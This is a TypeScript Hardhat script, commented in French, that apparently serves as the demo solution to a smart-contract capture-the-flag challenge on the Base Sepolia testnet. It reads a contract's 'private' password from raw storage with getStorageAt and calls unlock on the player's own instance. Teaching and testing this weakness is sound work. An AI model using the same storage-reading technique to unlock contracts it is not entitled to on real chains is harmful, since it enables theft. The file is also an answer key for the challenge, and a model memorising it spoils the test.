// Exploit de l'épreuve 3 (Coffre-fort à code) pendant la démo, sur Base Sepolia.
//
// `private` ne cache rien : n'importe qui lit le slot 1 d'une instance avec
// eth_getStorageAt. Le script affiche les deux slots, puis appelle `unlock` avec
// le mot de passe lu. Aucun contrat n'est déployé.
//
// La transaction part du compte du keystore (BASE_SEPOLIA_PRIVATE_KEY) : pour la
// démo, celui du joueur, qui ouvre ainsi son propre coffre. `unlock` est ouvert à
// tous, et `validateInstance` vérifie seulement que l'instance est celle du
// joueur et qu'elle est ouverte. Le joueur clique ensuite « Vérifier ma
// réussite » sur le site.
//
//   INSTANCE=0x… pnpm demo:codesafe            # lit puis ouvre
//   INSTANCE=0x… READ_ONLY=1 pnpm demo:codesafe  # lit seulement
import { network } from "hardhat"
import { getAddress, hexToBigInt, isAddress, type Hex } from "viem"

const raw = process.env.INSTANCE ?? ""
if (!isAddress(raw)) {
  throw new Error(
    "INSTANCE doit être l'adresse de l'instance (« Ton instance » sur la page du CTF)."
  )
}
const instance = getAddress(raw)
const readOnly = process.env.READ_ONLY === "1"

const connection = await network.create()
const { viem } = connection
const publicClient = await viem.getPublicClient()

const code = await publicClient.getCode({ address: instance })
if (!code || code === "0x") {
  throw new Error(`Aucun contrat à ${instance} sur ${connection.networkName}.`)
}

const slot = (n: number) =>
  publicClient.getStorageAt({ address: instance, slot: `0x${n.toString(16)}` })
const slot0 = (await slot(0)) ?? "0x"
const password = ((await slot(1)) ?? "0x") as Hex

console.log(`Réseau      : ${connection.networkName}`)
console.log(`Instance    : ${instance}`)
console.log(
  `slot 0      : ${slot0}  (locked = ${hexToBigInt(slot0 as Hex) === 1n})`
)
console.log(`slot 1      : ${password}  (password, déclaré private)`)

const safe = await viem.getContractAt("CodeSafe", instance)
if (readOnly) {
  console.log("Lecture seule : rien n'a été envoyé.")
} else if (!(await safe.read.locked())) {
  console.log("Le coffre est déjà ouvert : cliquer « Vérifier ma réussite ».")
} else {
  const hash = await safe.write.unlock([password])
  console.log(`unlock      : ${hash}`)
  await publicClient.waitForTransactionReceipt({ hash })
  console.log(
    `locked      : ${await safe.read.locked()}. Cliquer « Vérifier ma réussite » sur le site.`
  )
  if (connection.networkName === "baseSepolia") {
    console.log(`Basescan    : https://sepolia.basescan.org/tx/${hash}`)
  }
}
